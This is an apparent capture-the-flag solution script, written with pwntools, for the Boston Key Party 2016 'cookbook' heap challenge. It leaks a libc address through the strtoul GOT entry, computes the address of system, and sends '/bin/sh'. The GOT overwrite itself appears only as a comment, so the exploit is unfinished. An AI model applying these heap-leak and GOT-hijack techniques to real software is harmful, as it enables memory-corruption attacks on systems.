# -*- coding: utf-8 -*-
#
# Boston Key Party 2016 pwnable cookbook
#

from pwn import *
import re
import ctypes

r = process('./cookbook')

b = ELF('./cookbook')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

STRTOUL_GOT = b.got['strtoul']
STRTOUL_OFFSET = libc.symbols['strtoul']
SYSTEM_OFFSET = libc.symbols['system']

def s(msg):
    r.send(msg + '\n')

def stou(i):
    return ctypes.c_uint32(i).value

def fill_heap(nr):
    for i in xrange(0, nr):
        s('g')
        s(hex(0x5))
        s(p32(0xdeadbeef))

def add_leak(addr, groom=0x200):
    if groom > 0:
        fill_heap(groom)
    s('c')
    s('n') # malloc
    s('g')
    s(p32(0xdeadbeef))

    s('d') # free
    s('q')

    s('a')
    s('n') # malloc
    s('g')
    s(p32(0xcafebabe))
    s('e') # add CURRENT_INGREDIENT to INGREDIENT_LIST
    s('q')

    s('c')
    s('g')
    OVERWRITE = 'AAAABBBBCCCC' + p32(addr) + p32(0)
    s(OVERWRITE)
    s('q')

def parse_ingredient():
    r.clean()
    s('l')
    resp = r.recv()
    print resp
    li = resp.split('------')
    last = li[-2]
    m = re.search("calories: ([ +-]\d+)", last)
    return stou(int(m.groups()[0]))

if __name__ == "__main__":
    r.recvuntil("what's your name?")
    s('babo')

    #
    # calc LIBC_BASE
    #
    add_leak(STRTOUL_GOT)
    leaked = parse_ingredient()
    LIBC_BASE = leaked - STRTOUL_OFFSET

    log.info('LIBC_BASE: 0x%x' % LIBC_BASE)
    log.info('system: 0x%x' % (LIBC_BASE + SYSTEM_OFFSET))

    #
    # exploit unlink & overwrite strtoul@got with LIBC_BASE+SYSTEM_OFFSET
    #

    #
    # strtoul("/bin/sh")
    #
    s('g')
    s('/bin/sh\x00')
    
    r.clean()
    r.interactive()
